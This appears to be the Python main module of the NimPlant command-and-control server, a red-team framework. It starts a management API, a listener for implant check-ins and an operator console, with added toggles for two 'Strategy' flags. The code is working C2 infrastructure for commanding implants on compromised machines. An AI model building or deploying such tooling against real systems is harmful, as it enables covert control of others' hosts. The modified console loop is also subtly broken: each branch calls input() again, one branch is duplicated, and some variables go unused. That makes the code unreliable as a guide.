#!/usr/bin/python3

# -----
#
#   NimPlant Server - The "C2-ish"™ handler for the NimPlant payload
#   By Cas van Cooten (@chvancooten)
#
# -----

import threading
import time
import datetime
import random

from .api.server import api_server, server_ip, server_port
from .util.db import initDb, dbInitNewServer, dbPreviousServerSameConfig
from .util.func import nimplantPrint, periodicNimplantChecks
from .util.listener import *
from .util.nimplant import *
from .util.input import *


def main(xor_key=459457925, name=""):
    # Initialize the SQLite database
    initDb()

    # Restore the previous server session if config remains unchanged
    # Otherwise, initialize a new server session
    if dbPreviousServerSameConfig(np_server, xor_key):
        nimplantPrint("Existing server session found, restoring...")
        np_server.restoreServerFromDb()
    else:
        np_server.initNewServer(name, xor_key)
        dbInitNewServer(np_server)

    # Start daemonized Flask server for API communications
    t1 = threading.Thread(name="Listener", target=api_server)
    t1.setDaemon(True)
    t1.start()
    nimplantPrint(f"Started management server on http://{server_ip}:{server_port}.")

    # Start another thread for NimPlant listener
    def startListener(port = listenerPort):
        t2 = threading.Thread(name="Listener", target=flaskListener, args=(xor_key,))
        t2.setDaemon(True)
        t2.start()
        nimplantPrint(
            f"Started NimPlant listener on {listenerType.lower()}://{listenerIp}:{port}. CTRL-C to cancel waiting for NimPlants."
        )

    currentPort = listenerPort
    startListener()

    # Start another thread to periodically check if nimplants checked in on time
    t3 = threading.Thread(name="Listener", target=periodicNimplantChecks)
    t3.setDaemon(True)
    t3.start()

    possiblePorts = [8080, 8081, 8082, 8083, 8084, 8085, 8086, 8087]
    list_length = len(possiblePorts)

    # Run the console as the main thread
    while True:
        try:
            if np_server.isActiveNimplantSelected():
                promptUserForCommand()

            # This was commented out such that it is possible to activate/deactivate Strategies in the command line
            # Otherwise Nimplants would be automatically selected in the command line and then no Strategies can be commanded
            # elif np_server.containsActiveNimplants():
                # np_server.selectNextActiveNimplant()

            elif input() == "Strategy One":
                np_server.strategyOneEnabled = not np_server.strategyOneEnabled
                print("Strategy 1 enabled: " + str(np_server.strategyOneEnabled))
            elif input() == "Strategy Two":
                np_server.strategyTwoEnabled = not np_server.strategyTwoEnabled
                print("Strategy 2 enabled: " + str(np_server.strategyTwoEnabled))
            elif input() == "Strategy Two":
                np_server.strategyTwoEnabled = not np_server.strategyTwoEnabled
                print("Strategy 2 enabled: " + str(np_server.strategyTwoEnabled))

            else:
                pass

            time.sleep(0.5)

        except KeyboardInterrupt:
            exitServerConsole()
